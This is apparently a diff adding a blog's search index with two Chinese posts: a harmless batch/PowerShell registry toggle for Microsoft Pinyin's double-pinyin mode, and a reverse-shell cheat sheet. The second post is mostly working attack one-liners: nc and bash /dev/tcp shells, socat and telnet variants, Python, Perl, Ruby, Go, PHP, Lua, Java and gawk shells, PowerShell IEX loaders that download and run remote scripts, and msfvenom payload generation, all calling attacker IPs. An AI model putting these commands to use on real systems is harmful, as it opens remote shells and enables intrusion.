@@ -1,0 +1,209 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Windows下快速切换全拼/双拼</title>
+    <url>/2021/11/09/Windows%E4%B8%8B%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E5%85%A8%E6%8B%BC-%E5%8F%8C%E6%8B%BC/</url>
+    <content><![CDATA[<h2 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼/双拼"></a>Windows下快速切换全拼/双拼</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="ChangeAll-bat"><a href="#ChangeAll-bat" class="headerlink" title="ChangeAll.bat"></a>ChangeAll.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x1 /f</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="ChangeDouble-bat"><a href="#ChangeDouble-bat" class="headerlink" title="ChangeDouble.bat"></a>ChangeDouble.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x0 /f</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeAll.bat&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeDouble.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>目前已经做成了 uTools 插件 , 插件名称 : <code>切换微软全拼</code></p>
+<p>项目地址: <a href="https://github.com/syyu6/utools-ChangeDouble">https://github.com/syyu6/utools-ChangeDouble</a></p>
+<p>And so on …</p>
+<p>utools 快捷命令</p>
+<h3 id="实现-ps1-脚本"><a href="#实现-ps1-脚本" class="headerlink" title="实现 ps1 脚本"></a>实现 ps1 脚本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = reg query HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span>; </span><br><span class="line"><span class="variable">$outStr</span> = <span class="variable">$out</span> <span class="operator">-as</span> [<span class="built_in">string</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$outStr</span> <span class="operator">-match</span> <span class="string">&#x27;(Pinyin.+0x)(\d)&#x27;</span>) &#123;<span class="variable">$mode</span> = <span class="variable">$Matches</span>[<span class="number">2</span>] &#125; <span class="keyword">else</span> &#123; <span class="variable">$mode</span> = <span class="number">1</span> &#125;; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> <span class="operator">-as</span> [<span class="built_in">int</span>] <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="variable">$Double</span> = <span class="number">0</span> &#125; <span class="keyword">else</span> &#123; <span class="variable">$Double</span> = <span class="number">1</span> &#125;;</span><br><span class="line">reg.exe add HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span> /t REG_DWORD /d <span class="variable">$Double</span> /f;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Windows技巧</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反弹shell方式总结</title>
+    <url>/2021/11/09/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="反弹shell方式总结"><a href="#反弹shell方式总结" class="headerlink" title="反弹shell方式总结"></a>反弹shell方式总结</h2><h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a><code>nc反弹</code></h4><ul>
+<li>场景一 (<em>正向连接</em>)</li>
+</ul>
+<p><strong>viticm主机</strong>: nc开启本地监听, 并将本地的bash转发出去</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>attack主机</strong>: 远程连接 转发的shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc viticm_ip 9999</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>场景二(<em>反向连接</em>)</li>
+</ul>
+<p><strong>viticm主机</strong>: 当 viticm主机由于防火墙或者其他一些原因, 导致端口访问被拦截</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.119.137 9999 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>attack主机</strong>: 监听本地端口 , 获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="bash直接反弹"><a href="#bash直接反弹" class="headerlink" title="bash直接反弹"></a><code>bash直接反弹</code></h4><p>bash一句话shell反弹：个人感觉最好用的用的方法就是使用的方法就是使用bash结合重定向方法的一句话，具体命令如下。</p>
+<ul>
+<li>bash反弹一句话</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>bash一句话命令详解</li>
+</ul>
+<p>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下: </p>
+<p><a href="https://p0.ssl.qhimg.com/t01eb18cc78117e5c93.png"><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01eb18cc78117e5c93-1612330896146.png" alt="http://p6.qhimg.com/t013e425e5510c369cc.png"></a></p>
+<p>其实以上bash反弹一句完整的解读过程就是：</p>
+<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
+<h4 id="socat转发"><a href="#socat转发" class="headerlink" title="socat转发    "></a><code>socat转发    </code></h4><p>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat     </span><br><span class="line">chmod 755 /tmp/socat</span><br><span class="line">/tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.119.137:9999</span><br></pre></td></tr></table></figure>
+
+<p>socat下载链接：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p>
+<ul>
+<li>attack机器上开启监听</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:9999</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>viticm机器反弹shell</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.119.137:9999</span><br></pre></td></tr></table></figure>
+
+<h4 id="tlnet转发"><a href="#tlnet转发" class="headerlink" title="tlnet转发"></a><code>tlnet转发</code></h4><ul>
+<li>viticm机器执行下面的命令</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mknod a p; telnet 192.168.119.137 4444 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>attack机器监听端口</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>以上反弹shell时, 可能出现 无命令头, 无法补全的问题</p>
+<p>使用python的pty库进行解决</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">//$ <span class="built_in">export</span> TERM=xterm-256color</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="利用编程语言反弹shell"><a href="#利用编程语言反弹shell" class="headerlink" title="利用编程语言反弹shell"></a>利用编程语言反弹shell</h3><h4 id="1-py反弹shell"><a href="#1-py反弹shell" class="headerlink" title="1. py反弹shell"></a><code>1. py反弹shell</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拆成多行方便阅读</span></span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;ip&#x27;</span>,port))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-perl反弹shell"><a href="#2-perl反弹shell" class="headerlink" title="2. perl反弹shell"></a><code>2. perl反弹shell</code></h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=”10.211.55.2&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆成多行方便阅读</span></span><br><span class="line"><span class="keyword">use</span> Socket</span><br><span class="line">$i=”<span class="number">10.211</span>.<span class="number">55.2</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">$p=7777</span></span><br><span class="line"><span class="string">socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;</span>tcp<span class="string">&quot;))</span></span><br><span class="line"><span class="string">if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;</span></span><br><span class="line"><span class="string">    open(STDIN,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    open(STDOUT,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    open(STDERR,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    exec(&quot;</span>/bin/sh -i<span class="string">&quot;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-ruby反弹shell"><a href="#3-ruby反弹shell" class="headerlink" title="3. ruby反弹shell"></a>3. <code>ruby反弹shell</code></h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)’</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-go反弹shell"><a href="#4-go反弹shell" class="headerlink" title="4. go反弹shell"></a>4. <code>go反弹shell</code></h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;192.168.0.134:8080&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.<span class="keyword">go</span> &amp;&amp; <span class="keyword">go</span> run /tmp/t.<span class="keyword">go</span> &amp;&amp; rm /tmp/t.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5-php反弹shell"><a href="#5-php反弹shell" class="headerlink" title="5. php反弹shell"></a>5. <code>php反弹shell</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php –r  <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777&quot;)’</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="6-lua反弹shell"><a href="#6-lua反弹shell" class="headerlink" title="6. lua反弹shell"></a>6. <code>lua反弹shell</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-java"><a href="#7-java" class="headerlink" title="7. java"></a><code>7. java</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-gawk"><a href="#8-gawk" class="headerlink" title="8. gawk"></a><code>8. gawk</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/gawk -f</span><br><span class="line"></span><br><span class="line">BEGIN &#123;</span><br><span class="line">        Port    =       8080</span><br><span class="line">        Prompt  =       &quot;bkd&gt; &quot;</span><br><span class="line"></span><br><span class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</span><br><span class="line">        while (1) &#123;</span><br><span class="line">                do &#123;</span><br><span class="line">                        printf Prompt |&amp; Service</span><br><span class="line">                        Service |&amp; getline cmd</span><br><span class="line">                        if (cmd) &#123;</span><br><span class="line">                                while ((cmd |&amp; getline) &gt; 0)</span><br><span class="line">                                        print $0 |&amp; Service</span><br><span class="line">                                close(cmd)</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; while (cmd != &quot;exit&quot;)</span><br><span class="line">                close(Service)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="powershell反弹shell"><a href="#powershell反弹shell" class="headerlink" title="powershell反弹shell"></a>powershell反弹shell</h3><p>powershell反弹shell本质上是一些多功能代码集合，通过调用windows提供的api接口实现网络通信和指令解析执行的功能。</p>
+<h4 id="1）powercat反弹shell"><a href="#1）powercat反弹shell" class="headerlink" title="1）powercat反弹shell"></a>1）powercat反弹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134)开启监听：</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="comment"># 或者使用powercat监听</span></span><br><span class="line">powercat -l -p 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机反弹cmd shell：</span></span><br><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString</span><br><span class="line">(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);</span><br><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2）nishang反弹shell"><a href="#2）nishang反弹shell" class="headerlink" title="2）nishang反弹shell"></a>2）nishang反弹shell</h4><p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p>
+<p><strong>Reverse TCP shell</strong></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134)开启监听：</span></span><br><span class="line">nc <span class="literal">-lvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机执行：</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com</span></span><br><span class="line"><span class="string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者将nishang下载到攻击者本地：</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Reverse UDP shell</strong></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134)开启监听：</span></span><br><span class="line">nc <span class="literal">-lvup</span> <span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机执行：</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">53</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Reverse ICMP shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先攻击端下载icmpsh_m.py文件</span></span><br><span class="line">https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者(192.168.159.134)执行</span></span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1 <span class="comment">#忽略所有icmp包</span></span><br><span class="line">python icmpsh_m.py 192.168.159.134 192.168.159.138 <span class="comment">#开启监听</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机(192.168.159.138)执行</span></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#x27;</span>);Invoke-PowerShellIcmp -IPAddress 192.168.159.134</span><br></pre></td></tr></table></figure>
+
+<h4 id="3）自定义powershell函数反弹shell"><a href="#3）自定义powershell函数反弹shell" class="headerlink" title="3）自定义powershell函数反弹shell"></a>3）自定义powershell函数反弹shell</h4><p>利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134) 开启监听 </span></span><br><span class="line">nc <span class="literal">-lvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机执行 </span></span><br><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object Net.Sockets.TCPClient(&#x27;192.168.159.134&#x27;,6666);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span></span><br><span class="line"><span class="string">[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;</span></span><br><span class="line"><span class="string"><span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );</span></span><br><span class="line"><span class="string"><span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span></span><br><span class="line"><span class="string"><span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4）Empire-结合office反弹shell"><a href="#4）Empire-结合office反弹shell" class="headerlink" title="4）Empire 结合office反弹shell"></a>4）Empire 结合office反弹shell</h4><p>Empire(<a href="https://github.com/EmpireProject/Empire)%E5%9F%BA%E4%BA%8Epowershell%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%8F%AF%E5%88%A9%E7%94%A8office%E5%AE%8F%E3%80%81OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E3%80%81HTML%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F(HTAs)%E7%AD%89%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E3%80%82">https://github.com/EmpireProject/Empire)基于powershell的后渗透攻击框架，可利用office宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell。</a></p>
+<ul>
+<li>利用office宏反弹shell </li>
+<li>利用office OLE对象插入bat文件反弹shell</li>
+</ul>
+<p><strong>Relevant Link:</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/99793</span><br></pre></td></tr></table></figure>
+
+<h3 id="msfvenom-获取反弹一句话"><a href="#msfvenom-获取反弹一句话" class="headerlink" title="msfvenom 获取反弹一句话"></a><strong>msfvenom 获取反弹一句话</strong></h3><p>学习过程中发现其实强大的MSF框架也为我们提供了生成一句话反弹shell的工具，即msfvenom。绝对的实用，当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit,随时我们都可以使用msfvenom -l 来查询生成我们所需要的各类命令行一句话，具体使用方法为各位看官老爷们收集如下。- </p>
+<ul>
+<li>查询 payload 具体路径</li>
+</ul>
+<p>我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/unix/reverse），找出我们需要的各类反弹一句话payload的路径信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msfvenom -l payloads &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://p3.ssl.qhimg.com/t01368126ef4dfcc554.png"><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01368126ef4dfcc554.png" alt="http://p9.qhimg.com/t014f984e560232d602.png"></a></p>
+<p>查看以上截图，我们可以看到msfvenom支持生成反弹shell一句话的类型非常丰富，这里几乎是应有尽有，大家可以依据渗透测试对象自行选择使用。</p>
+<p><strong>生成我们我们需要的命令行一句话</strong></p>
+<p>依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。</p>
+<h4 id="bash-反弹一句话生成"><a href="#bash-反弹一句话生成" class="headerlink" title="bash 反弹一句话生成"></a><strong>bash 反弹一句话生成</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>
+
+<h4 id="阉割版nc反弹一句话生成"><a href="#阉割版nc反弹一句话生成" class="headerlink" title="阉割版nc反弹一句话生成"></a><strong>阉割版nc反弹一句话生成</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01bc2936c36f38c0e9.png" alt="https://p0.ssl.qhimg.com/t01bc2936c36f38c0e9.png"></p>
+<h4 id="获取python一句话"><a href="#获取python一句话" class="headerlink" title="获取python一句话"></a><strong>获取python一句话</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01f8abd9cc27aac7ca.png" alt="https://p0.ssl.qhimg.com/t01f8abd9cc27aac7ca.png"></p>
+<p>参考链接</p>
